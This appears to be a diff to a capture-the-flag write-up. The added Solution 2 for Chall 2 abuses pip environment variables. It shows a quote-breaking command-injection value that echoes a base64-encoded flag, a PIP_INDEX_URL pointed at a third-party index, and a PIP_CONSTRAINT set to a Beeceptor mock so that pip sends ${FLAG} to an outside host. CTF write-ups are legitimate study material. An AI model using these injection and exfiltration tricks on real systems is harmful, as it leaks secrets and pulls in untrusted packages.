@@ -6,12 +6,27 @@ Hello, there!'; echo "Here is your flag: ${FLAG}" | base64 ;echo 'General Kenobi
  
 # Chall 2
 
+## Solution 1
 [PIP environment variables doc](https://pip.pypa.io/en/latest/cli/pip_install/) PIP_<UPPER_LONG_NAME>
 [Pypi PyYAML](https://pypi.org/project/PyYAML/)
 [Cloudsmith](https://cloudsmith.io/~nebco/packages/)
 ``` bash
 Not a release :(
 PIP_INDEX_URL=https://cloudsmith.io/~nebco/packages/#
+```
+
+## Solution 2
+[Beeceptor](https://beeceptor.com/)
+[Beeceptor for the demo](https://app.beeceptor.com/console/tdf123456)
+
+Configure Beeceptor :
+- Add new "Mocking Rules"
+- Match value: "/<file_name>.txt"
+- Response body: "pyyaml@https://tdf123456.free.beeceptor.com/${FLAG}%"
+
+``` bash
+Not a release :(
+PIP_CONSTRAINT=https://tdf123456.free.beeceptor.com/get-flag
 ```
 
 # Chall 3
